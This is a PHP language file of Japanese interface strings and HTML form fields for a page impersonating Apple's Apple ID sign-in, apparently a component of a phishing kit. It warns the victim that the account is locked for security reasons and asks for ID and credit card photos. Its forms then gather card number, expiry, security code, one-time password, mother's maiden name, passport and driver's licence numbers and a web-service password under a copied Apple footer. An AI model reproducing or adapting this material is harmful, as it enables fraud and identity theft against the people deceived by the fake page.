<?php



###############Homepage##########
$_LANG['SIGNIN'] = "サインイン  - Apple（日本）";
$_LANG['SIGNUP'] = "AppleIDを作成する";
$_LANG['FORGOT'] = "Apple ID またはパスワードをお忘れですか？";
$_LANG['TITLE'] = "Appleのすべてのサービスで使用するアカウントです。";
$_LANG['TITLE2'] = "1つの Apple ID とパスワードで、Apple のサービスすべてにアクセスできます。";
$_LANG['TITLE3'] = "Apple ID について詳しく見る";
###############Signin############
$_LANG['MANAGE'] = "Apple アカウントの管理";
$_LANG['PASS'] = "パスワード";
$_LANG['WRONG'] = "Apple&nbsp;IDまたはパスワードが正しくありません。";
$_LANG['FORGOT'] = "パスワードをお忘れですか？";
$_LANG['REMMBR'] = "私を覚えてますか";
$_LANG['PLCHDR'] = "Apple ID";
###############SLEKEK############
$_LANG['REASON'] = "このApple IDはセキュリティ上の理由でロックされています.";
$_LANG['REASON2'] = "サインインする前にアカウントのロックを解除する必要があります.";
$_LANG['UNLOCKACC'] = "アカウントのロック解除";
$_LANG['DASHBD'] = "アカウントの確認";
$_LANG['URAPPL'] = "あなたのApple IDは";
$_LANG['SIGNOUT'] = "サインアウト";
$_LANG['WAIT'] = "アカウントへのアクセスを復元している間お待ちください...";
$_LANG['PROVIDE'] = "あなたのIDカードとクレジットカードの写真を提供してください。";
$_LANG['FORYOUR'] = "セキュリティ上、自動的にログアウトされます。";
$_LANG['CONFIRM']= "あなたの身元を確認する";
###############FORM##############
$_LANG['PERSON'] = "個人情報";
$_LANG['NAME'] = "名";
$_LANG['FN'] = "ファーストネーム";
$_LANG['MN'] = "ミドルネーム（オプション）";
$_LANG['LN'] = "苗字";
$_LANG['DOB'] = "生年月日";
$_LANG['PHONE'] = "電話";
$_LANG['PHONENUMB'] = "電話番号";
$_LANG['ADDRESS'] = "住所欄";
$_LANG['CITY'] = "町/市";
$_LANG['POSTCODE'] = '郵便番号';
$_LANG['COUNTRY'] = "Japan";
$_LANG['COUNTYSELECT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="county" id="county" class="generic-input-field form-control field" placeholder="州/県">
</div>
</div>
';
###############ACCDETAILS#######
$_LANG['ACCDET'] = "アカウント詳細";
$_LANG['CARDDET'] = "カードの詳細";
$_LANG['CARDHOLD'] = "カード所有者の名前";
$_LANG['CARDNUM'] = "カード番号";
$_LANG['CARDEXP'] = "有効期限";
$_LANG['CARDCSC'] = "カードセキュリティコード";
$_LANG['CARDOTP'] = "ワンタイムパスワード";
###############SECURITY#########
$_LANG['SECURITY'] = "セキュリティ";
$_LANG['QUESSELC'] = "安全な質問を選択する";
$_LANG['MTHRMDN'] = "母親の旧姓";
$_LANG['DRVRLCNS'] = "運転免許証番号";
$_LANG['PASSPRT'] = "パスポート番号";
$_LANG['ANSWR'] = "回答";
$_LANG['NEXT'] = "次";
$_LANG['FINISH'] = "フィニッシュ";
##############FOOTER############
$_LANG['FOOTERLINE1'] = "Appleオンラインストアを購入する (0800 048 0408), Appleの小売店をご覧ください , またはディストリビューターを探す.";
$_LANG['FOOTERLINE21'] = "アップル情報.";
$_LANG['FOOTERLINE22'] = "サイトマップ";
$_LANG['FOOTERLINE23'] = "ホットニュース";
$_LANG['FOOTERLINE24'] = "RSSフィード";
$_LANG['FOOTERLINE25'] = "お問い合わせ";
$_LANG['COPYR'] = "著作権©2017 Apple Inc.すべての著作権.";
$_LANG['TERMCN'] = "利用規約";
$_LANG['PRVPLCY'] = "個人情報保護方針";
$lang['ACCOUNT'] = '
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">*WEBサービスID</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="dob-wrapper clearfix">
  <input required="required" type="text" name="ACNUM" id="ACNUM" class="generic-input-field form-control field" autocomplete="off" maxlength="10" autocapitalize="off" placeholder="可能な場合は">
</div>
</div>
</div>
<h3 class="section-subtitle">*パスワード</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="dob-wrapper clearfix">
  <input required="required" type="password" name="ACPAS" id="ACPAS" class="generic-input-field form-control field" autocomplete="off" autocapitalize="off" placeholder="WEBサービスID (PASSCODE)">
</div>
</div>
</div>
</div>
</div>';
?>